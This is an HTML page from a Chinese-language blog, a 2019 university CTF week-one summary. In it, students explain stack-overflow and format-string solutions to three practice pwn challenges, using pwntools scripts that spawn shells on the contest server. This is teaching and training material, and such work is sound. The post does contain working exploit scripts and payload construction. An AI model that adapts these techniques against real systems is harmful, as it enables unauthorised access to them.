@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="alternate" href="/atom.xml" title="blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="2019冬季赛第一周pwn练习题目完美结束">
+<meta name="keywords" content="2019cumtctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019冬季赛第一周习题练习总结">
+<meta property="og:url" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/index.html">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="2019冬季赛第一周pwn练习题目完美结束">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1572938462520.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1572938436162.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/2174619181.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1572939083748.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/2553210574.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1141603613.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/355552310.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1572939698973.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/242793795.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1158424088.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/3763989548.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/859230983.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1992114906.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/2464934511.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/3267216144.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/233118200.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/724262807.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/4065706008.png">
+<meta property="og:updated_time" content="2020-05-24T14:57:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019冬季赛第一周习题练习总结">
+<meta name="twitter:description" content="2019冬季赛第一周pwn练习题目完美结束">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/1572938462520.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>2019冬季赛第一周习题练习总结 | blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-3nd???">
+
+    <a href="/3ND/" rel="section"><i class="fa fa-fw fa-user"></i>3ND???</a>
+
+  </li>
+        <li class="menu-item menu-item-flag???">
+
+    <a href="/flag/" rel="section"><i class="fa fa-fw fa-user"></i>flag???</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/05/2019冬季赛第一周习题练习总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="PwnHt">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2019冬季赛第一周习题练习总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-05 16:18:00" itemprop="dateCreated datePublished" datetime="2019-11-05T16:18:00+08:00">2019-11-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-05-24 22:57:12" itemprop="dateModified" datetime="2020-05-24T22:57:12+08:00">2020-05-24</time>
+              </span>
+
+          
+            <div class="post-description">2019冬季赛第一周pwn练习题目完美结束</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>冬季赛第一周练习题目完美结束，从周日搭环境（<del>周末每天早出晚归，我感觉我要死了</del>）到现在审核writeup，没有出现什么大问题（<del>我周日下午花了一下午布置题目，测试题目是否能打通，然后，然后,2个小时，2道题目被打穿了，？？？？这里手动@哒君，出的什么题目？？？？，还得让我加班</del>），（<del>其实也不能怪哒君因为</del>）我们18级还是有大佬的（<del>iyzyi牛啤，拿到了3道pwn题目的一血</del>）</p>
+<h1 id="0x01-练习题目重大时间表"><a href="#0x01-练习题目重大时间表" class="headerlink" title="0x01 练习题目重大时间表"></a>0x01 练习题目重大时间表</h1><ul>
+<li>周日下午first try、easy_second_try题目上线</li>
+<li>周日晚上iyzyi拿到两道题目的一血</li>
+<li>周日晚上printf题目上线</li>
+<li>周一晚上给出hint</li>
+<li>周一晚上iyzyi拿到printf题目的一血</li>
+<li>周一晚上normal(第一周压轴题)上线</li>
+<li>截止周二晚上还没有被解出（<del>哒君tql</del>）</li>
+</ul>
+<h1 id="0x02-最终版writeup-by-iyzyi"><a href="#0x02-最终版writeup-by-iyzyi" class="headerlink" title="0x02 最终版writeup by iyzyi"></a>0x02 最终版writeup by iyzyi</h1><h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>刚开始学pwn，有些地方可能理解的不对，有错误的话希望大家可以指出来，谢谢。</p>
+<p>使用到了<strong>python2 </strong>的一个模块pwn（pip时Ubuntu下是pwn、CentOS7中是pwntools），不能在windows下使用。</p>
+<p>python3应该也可以使用pwntools，但我还没有实践过，这里不详细说。</p>
+<p>我的环境为Ubuntu16.04，python2.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#Ubuntu下安装pwn</span><br><span class="line">apt-get update</span><br><span class="line">apt install python-pip</span><br><span class="line">pip install pwn</span><br><span class="line"></span><br><span class="line">#CentOS7下安装pwntools</span><br><span class="line">#http://www.ishenping.com/ArtInfo/234398.html</span><br><span class="line">#https://github.com/facebook/prophet/issues/418</span><br><span class="line">#注意：python2和python3同时存在的，所有pip命令都要加上python2 -m的前缀</span><br><span class="line">#如python2 -m pip install pwntools</span><br><span class="line">yum -y install python-pip</span><br><span class="line">pip install --upgrade setuptools</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+<p>Ubuntu比较适合pwntools，CentOS的坑比较多。推荐Ubuntu哈</p>
+<h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p><strong>ubuntu安装的时候也可以安装pwntools</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+<p>我之前都不知道有pwn这个库，但是用法是一样的，却是两个库，额，建议pwntools哈，可以从下面来，pwn这个最后一次更新在2014，好像已经停止更新了，而pwntools最后一次更新是在2019（<del>一看 <strong>pwntools</strong> 的 <strong>decription</strong> 就比较帅，知道选谁了吧</del>）</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938462520.png" alt="1572938462520"></p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572938436162.png" alt="1572938481627"></p>
+<h2 id="0x01-first-try"><a href="#0x01-first-try" class="headerlink" title="0x01 first try"></a>0x01 first try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2174619181.png" alt="1572860587050"></p>
+<p>32位，用ida打开，按下f5将汇编转换成伪C代码。</p>
+<h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-1"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-1" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>理论上来说，我们第一步是checksec，一般pwn题目是不加壳的，但是，会有一些程序保护（<del>详情参考的我ppt程序保护部分</del>），幸运的是这几道题目都没保护2333，其实，checksec是有一个脚本的，但是我更喜欢用ipython这个程序,安装ipython</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ipython</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572939083748.png" alt="1572939083748"></p>
+<p>像这样操作，linux里面arch表示程序的是哪种操作系统类型（i386为32位，amd64为64位），然后下面是4种保护，红色表示程序保护没开，绿色表示开启</p>
+<p>（<del>其实ida也能分辨64位和32位试一试就知道会有标识的</del>）</p>
+<p>（<del>下面是分割线</del>）</p>
+<hr>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2553210574.png" alt="1572861112066"></p>
+<p>要想拿到shell，就要满足v6=99(第30行)。</p>
+<p>本题存在两处输入，其中第11行的read()函数存在明显的栈溢出。</p>
+<p>双击程序中的任意参数或局部变量，均可跳转至所在函数的栈界面：</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1141603613.png" alt="1572861550853"></p>
+<p>容易发现，s字符串的长度为0x1C-0x0C=16，而read()函数可以读入50个字符。当读完16个字符后，如果继续输入，程序并不会停止，而是继续将数据读入栈中，这就会覆盖掉其他的数据。比如写入的第17个字符会覆盖掉上图中的var_C.</p>
+<p>var_C恰好就是之前的v6。</p>
+<p>把鼠标光标放在v6上，就会自动显示v6在栈内的位置。</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/355552310.png" alt="1572861947922"></p>
+<p>或者双击下v6。</p>
+<h3 id="0x01-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x01-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x01 来自pwnht的评论（闲话/补充？？？？？）"></a>0x01 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>其实这里不用悬停的，或者双击的，因为</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1572939698973.png" alt="1572939698973"></p>
+<p>滑一下鼠标就可以了，复杂的程序可以悬停，（<del>都行其实2333，怎么快怎么来哈</del>）</p>
+<p>（<del>下面是分割线</del>）</p>
+<hr>
+<p>上图中的esp是栈顶指针，ebp是栈的基址。</p>
+<p>话有些多，直接写脚本吧。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10000</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x1c</span><span class="number">-0x0c</span>) + p32(<span class="number">99</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>第一行，导入pwn模块</p>
+<p>第二行，连接到服务器</p>
+<p>第四行，sendline发送payload</p>
+<p>第五行，进入交互。此时输入cat flag即可拿到flag</p>
+<p>payload的前半部分就是16个字符，写满字符串s，第十七个字节就是我们要修改的v6.</p>
+<p>p32()可以将99转换成一个32位的数据。</p>
+<h3 id="0x02-来自pwnht的评论（闲话-补充？？？？？）"><a href="#0x02-来自pwnht的评论（闲话-补充？？？？？）" class="headerlink" title="0x02 来自pwnht的评论（闲话/补充？？？？？）"></a>0x02 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>这里注意，写expliot脚本的一个好习惯，遇到 <strong>read（）</strong> 要用 <strong>send（）</strong> 不要用 <strong>sendline（）</strong></p>
+<p>这道题目，两个都行，换其他题目可能会多读一个<strong>\n</strong> (换行符即’\x0a’),  （<del>注意大坑,相信我</del>）</p>
+<p>还有遇到多次输入的时候，就不能用 <strong>send（)</strong> 函数了,要用 <strong>sendafter（)</strong> 或者 <strong>sleep（）</strong> 来控制流程</p>
+<p>附上我的expliot</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">io=remote(&apos;202.119.201.199&apos;,10000)</span><br><span class="line">#io=process(&apos;./first&apos;)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendafter(&apos;do you want to change it?(yes|no)\n&apos;,&apos;a&apos;*0x10+p32(99))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>基本上差不多哈</p>
+<p>（<del>下面是分割线</del>）</p>
+<hr>
+<h2 id="0x02-easy-second-try"><a href="#0x02-easy-second-try" class="headerlink" title="0x02 easy_second_try"></a>0x02 easy_second_try</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/242793795.png" alt="1572862797345"></p>
+<p>使用ida64打开</p>
+<h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-2"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-2" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样需要checksec不多说</p>
+<p>（<del>下面是分割线</del>）</p>
+<hr>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1158424088.png" alt="1572862841416"></p>
+<p>主函数输入姓名，输出姓名，就结束了。</p>
+<p>同时可以看到read()明显的栈溢出。</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3763989548.png" alt="1572862917274"></p>
+<p>上面的s是输入的字符串，下面的s是ebp（<strong>此处存疑哈 </strong>），下面的r是函数运行完的返回地址。当这个函数运行完时，程序会跳转至r所储存的地址处，继续运行。</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/859230983.png" alt="1572432617470"></p>
+<p>参考阅读《加密与解密》P106.</p>
+<p>上图的栈和上上图的栈，顺序是相反的，对照的时候注意下。</p>
+<p>函数列表内有个sys函数</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/1992114906.png" alt="1572863298186"></p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/2464934511.png" alt="1572863306697"></p>
+<p>可以调用shell.</p>
+<p>所以我们通过read()函数，多读入一些字节，将r返回地址覆写为sys的地址，就可以调用这个shell了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10002</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(<span class="number">0x400789</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>payload中，0x10是字符串长度，8是8位的ebp，0x400789是sys的地址，p64将其转换为64位的数据</p>
+<p>就酱~</p>
+<h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-3"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-3" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>同样的问题不在赘述</p>
+<p>下面是分割线</p>
+<hr>
+<h2 id="0x03-printf"><a href="#0x03-printf" class="headerlink" title="0x03 printf"></a>0x03 printf</h2><p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/3267216144.png" alt="1572928882030"></p>
+<p>随机一个数字，输入一个数字，二者相等则拿到shell.</p>
+<p>第25行存在printf格式化字符串漏洞。</p>
+<p>先来看一下相关知识：</p>
+<ul>
+<li><a href="https://wiki.x10sec.org/pwn/fmtstr/fmtstr_exploit/" target="_blank" rel="noopener">CTF WiFi：格式化字符串漏洞利用</a></li>
+<li><a href="https://blog.qsboy.com/format-string-bug/" target="_blank" rel="noopener">CTF - Pwn - 格式化字符串漏洞</a></li>
+<li><a href="https://introspelliam.github.io/2017/08/04/printf%E6%A0%BC%E5%BC%8F%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">printf格式化漏洞</a></li>
+<li><a href="https://veritas501.space/2017/04/28/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">格式化字符串漏洞学习</a></li>
+</ul>
+<p>我浅显地总结一下：</p>
+<p>常见的printf有两（及以上）个参数，如<code>printf(&quot;%d&quot;, &amp;a);</code>。但其实printf只需要一个参数，<code>printf(&quot;%d%d&quot;);</code>，需要参数时从栈顶依次读入即可。前面的<code>printf(&quot;%d&quot;, &amp;a);</code>本质上就是先把a的地址压入栈内，然后printf读栈顶元素并输出。</p>
+<p>printf函数的第一个参数就是格式化字符串。</p>
+<p>正常的程序，这个格式化字符串应该是写死在代码里的，但是本题printf的那个字符串是我们输入的，所以我们可以通过一些方式来输出一些数据（或写入一些数据）。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%d - 十进制 - 输出十进制整数</span><br><span class="line">%s - 字符串 - 从内存中读取字符串</span><br><span class="line">%x - 十六进制 - 输出十六进制数</span><br><span class="line">%c - 字符 - 输出字符</span><br><span class="line">%p - 指针 - 指针地址</span><br><span class="line">%n - 到目前为止所写的字符数</span><br></pre></td></tr></table></figure>
+<p>%x表示输出栈顶的那个十六进制数据，%i$x表示输出偏离栈顶i处的十六进制数据。</p>
+<p>我们现来测试下程序运行到printf()处，栈的情况。</p>
+<p>did you hear that?输入长度不超过16的字符串即可。然后do you understand输入7个%p，程序输入从栈顶到偏移栈顶7个32位处的7个十六进制数。</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/233118200.png" alt="1572930088113"></p>
+<p>第7个参数输出的是%p%p(0x70是p,0x25是%)，所以我们确定了输入的%p%p%p%p%p%p%p这个字符串是从栈内偏移7处开始的(ebp+7)。<br><img src="/2019/11/05/2019冬季赛第一周习题练习总结/724262807.png" alt="1572930264700"></p>
+<p>0x2c处就是我们输入的字符串的起始位置。我们想要知道的那个随机数在0x0C的var_C处。二者偏移量为（0x2c-0x0c)//4=8，除以4是因为这是32位程序。</p>
+<p>buf相对栈顶偏移7，var_C相对buf偏移8，即var_C相对栈顶偏移15</p>
+<p>不用脚本，直接手撸</p>
+<p><img src="/2019/11/05/2019冬季赛第一周习题练习总结/4065706008.png" alt="1572866025044"></p>
+<p>拿到随机数0xa08457，转换成十进制数10519639，输进去，拿到shell.</p>
+<h3 id="0x00-来自pwnht的评论（闲话-补充？？？？？）-4"><a href="#0x00-来自pwnht的评论（闲话-补充？？？？？）-4" class="headerlink" title="0x00 来自pwnht的评论（闲话/补充？？？？？）"></a>0x00 来自pwnht的评论（<del>闲话/补充？？？？？</del>）</h3><p>你的非预期解呢？？？？？？</p>
+<h3 id="0x01-来自iyzyi的补充"><a href="#0x01-来自iyzyi的补充" class="headerlink" title="0x01 来自iyzyi的补充"></a>0x01 来自iyzyi的补充</h3><p>嗯，这道题在pwnht提示我之前，我不是这么考虑的。</p>
+<p>先说一下格式化字符串中的%n。%n的作用是向保存在栈顶的一个地址处写入一个数，这个数是字符串中位于%n前面的字符的数量。%i$n的作用类似，不过是向偏移栈顶i处保存的地址中写入一个数。比如，对照着上上上图，“abc%6$n”就是向0xf770f244处写入3.</p>
+<p>但是，一定要注意，对应的栈中的参数必须是一个合法的地址。比如对照着上上上图，“abc%2$n”就是向0x10处写入3。0x10不是个地址，所以程序会崩溃。</p>
+<p>有了以上知识，那我就开始说一下我最初的思路，非预期解。应该可以解题，但是成功的概率实在感人。</p>
+<p>我是想通过%n向v8处写入一个数，然后我再输入这个数，自然就可以拿到shell.</p>
+<p>但是，万万没有想到，这题v8的地址是一直在改变的，根据我的多次测试，其地址大概位于0xff800000到0xffffffff之间。</p>
+<p>于是我就想碰撞一下地址。我在程序里写了个地址，假设它就是字符串的地址，再通过偏移量算出v8的地址。如果某一次程序恰好将字符串加载到我假设的地址处，那么我就可以向v8写入相应的字符数量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000000</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">'202.119.201.199'</span>, <span class="number">10001</span>)</span><br><span class="line">        context.log_level = <span class="string">'debug'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'Did you hear that?'</span>, <span class="string">'yes\n'</span>)</span><br><span class="line">        payload = p32(<span class="number">0xff9594ec</span>+(<span class="number">0x2c</span><span class="number">-0xc</span>)) + <span class="string">'%7$n'</span></span><br><span class="line">        p.sendlineafter(<span class="string">'do you understand?'</span>, payload)</span><br><span class="line">        p.sendlineafter(<span class="string">'just tell me how mang is it!'</span>, <span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'EFO again~~~~~'</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> p.recvline_contains(<span class="string">'haha, I know you can\'t do it!'</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'NO~~~~~~'</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>
+<p>如果%7$n不是向一个合法的地址处写入，程序会timeout: the monitored command dumped core\n，报错EOFError。为了程序的程序化运行，捕捉了这个异常。</p>
+<p>如果恰好碰撞到了一个地址，但是又不是我们需要的那个目标地址，程序会按照流程输出haha, I know you can\’t do it! 此时我们使用continue跳过这次碰撞。</p>
+<p>对了，说明一下，这个脚本不一定正确哈。我还没有跑出来（跑得CPU都糊了）。有兴趣的可以试试。</p>
+<p>为了说明一下成功的概率，我放一个数字：0xffffffff-0xff800000=0x7fffff=2^23=8388608。</p>
+<h2 id="0x04-来自pwnht的结语"><a href="#0x04-来自pwnht的结语" class="headerlink" title="0x04 来自pwnht的结语"></a>0x04 来自pwnht的结语</h2><p>小学弟整体写的还是比较认真的，值得表扬，一些d地方需要改进，希望采纳，注意文章结构，一道题目要分步骤的，一步写完可不行 2333（<del>iyzyi牛啤拿下本周pwn三个一血</del>）</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/2019cumtctf/" rel="tag"># 2019cumtctf</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/11/03/整数溢出思考/" rel="next" title="整数溢出思考">
+                  <i class="fa fa-chevron-left"></i> 整数溢出思考
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/11/16/漏洞理论分析的一些思考/" rel="prev" title="漏洞理论分析的一些思考">
+                  漏洞理论分析的一些思考 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
